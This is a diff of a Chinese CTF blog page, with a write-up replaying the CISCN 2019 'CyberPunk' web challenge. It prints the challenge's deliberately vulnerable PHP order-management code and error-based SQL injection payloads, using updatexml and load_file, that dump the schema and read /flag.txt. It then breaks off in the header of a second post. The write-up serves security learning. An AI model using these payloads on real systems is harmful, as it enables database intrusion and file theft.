@@ -207,6 +207,802 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d711660d49.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d711660d49.html" class="post-title-link" itemprop="url">复现CISCN2019 华北赛区 Day1 Web5]CyberPunk</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-02 22:28:47" itemprop="dateCreated datePublished" datetime="2019-11-02T22:28:47+08:00">2019-11-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:17:31" itemprop="dateModified" datetime="2020-10-14T17:17:31+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>15 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><p>查看源码给了提示目测是文件包含</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/1573214441440.png" alt="img"></p>
+</li>
+<li><p>PHP伪协议直接读取源码</p>
+<p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108200230449.png" alt="image-20191108200230449"></p>
+</li>
+<li><p>源码如下：</p>
+<ul>
+<li>index.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);
+
+// $file = $_GET[&quot;file&quot;];
+$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
+if (isset($file)){
+    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
+        echo(&#39;no way!&#39;);
+        exit;
+    }
+    @include($file);
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;index&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot; /&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2&gt;2077鍙戝敭浜�,涓嶆潵浠藉疄浣撳吀钘忕増鍚�?&lt;/h2&gt;
+        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;h3&gt;鎻愪氦璁㈠崟&lt;/h3&gt;
+                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;濮撳悕:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;鐢佃瘽:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;h3&gt;鍦板潃:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;鎴戞鏄�侀挶涔嬩汉&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;璁㈠崟绠＄悊&lt;/h2&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戣鏌ヨ鍗�&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戣淇敼鏀惰揣鍦板潃&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戜笉鎯宠浜�&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!--?file=?--&gt;</code></pre>
+<ul>
+<li>confirm.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;;
+//var_dump($_POST);
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = $_POST[&quot;address&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if($fetch-&gt;num_rows&gt;0) {
+        $msg = $user_name.&quot;已提交订单&quot;;
+    }else{
+        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
+        $re = $db-&gt;prepare($sql);
+        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
+        $re = $re-&gt;execute();
+        if(!$re) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单提交成功&quot;;
+    }
+} else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;确认订单&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot;/&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+                &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+                &lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<ul>
+<li>search.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;; 
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        if(!$row) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;搜索&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;订单查询&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;查询订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;</code></pre>
+<ul>
+<li>change.php</li>
+</ul>
+<pre><code class="PHP">&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = addslashes($_POST[&quot;address&quot;]);
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
+        $result = $db-&gt;query($sql);
+        if(!$result) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单修改成功&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;修改收货地址&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;修改收货地址&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;h3&gt;地址:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;修改订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>delete.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
+        if(!$result) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单删除成功&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;删除订单&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot; /&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;删除订单&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;删除订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>config.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);
+
+$DATABASE = array(
+
+    &quot;host&quot; =&gt; &quot;127.0.0.1&quot;,
+    &quot;username&quot; =&gt; &quot;root&quot;,
+    &quot;password&quot; =&gt; &quot;root&quot;,
+    &quot;dbname&quot; =&gt;&quot;ctfusers&quot;
+);
+
+$db = new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);
+</code></pre>
+</li>
+<li><p>分析：</p>
+<ul>
+<li>我们从代码中可以看到在查询的时候使用了正则去过滤，在写入时候使用了预处理所以无法进行注入。但是可以注意到使用正则过滤的时候并没有对地址过滤，我们跟进可以发现在<code>change.php</code>里地址是拼接进sql语句了，但是使用了<code>addslashes()</code>对单引号进行了转义，导致无法逃逸，但是这里可以导致在修改地址时候会将地址查询出来再拼接到更新语句，那么这里就算我们逃逸不了但是可以将后面的单引号给注释掉导致报错，同时这里将sql错误内容给打印出来了，可以使用报错注入。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732167224952.png" alt="img"></p>
+</li>
+<li><p>构造payload</p>
+<pre><code class="php">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(database(),1,20)),0x7e),1)#</code></pre>
+<ul>
+<li>在写入时候将上面payload写入地址，而后修改该订单的地址就会显示报错。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732178817223.png" alt="img"></p>
+<ul>
+<li>爆表名</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(table_name,1,20)from information_schema.tables where table_schema=&#39;ctfusers&#39;),0x7e),1)#</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732192818932.png" alt="img"></p>
+<ul>
+<li>爆表段</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,20)from information_schema.columns where table_name=&#39;user&#39;),0x7e),1)#</code></pre>
+<p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108213119371.png" alt="image-20191108213119371"></p>
+<ul>
+<li>在表中并未查找出来flag，最后读文件读出来了</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#
+
+1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),20,50)),0x7e),1)#</code></pre>
+<ul>
+<li>flag</li>
+</ul>
+<pre><code class="mysq">flag{71ee17ac-d06a-4  4aca-91c3-ae8671029100} </code></pre>
+</li>
+<li><p>延伸</p>
+<ul>
+<li><p>UPDATEXML </p>
+<ul>
+<li><pre><code class="mysql">UPDATEXML (XML_document, XPath_string, new_value); </code></pre>
+<ul>
+<li>参数1：XML_document是String格式，为XML文档对象的名称，文中为Doc  </li>
+<li>参数2：XPath_string (Xpath格式的字符串)  </li>
+<li>参数3:    new_value，String格式，替换查找到的符合条件的数据  </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/2221785a2.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/2221785a2.html" class="post-title-link" itemprop="url">PHP-SESSION反序列化——复现巅峰极客一道WEB题</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-01 23:06:32" itemprop="dateCreated datePublished" datetime="2019-11-01T23:06:32+08:00">2019-11-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:48:10" itemprop="dateModified" datetime="2020-10-14T17:48:10+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
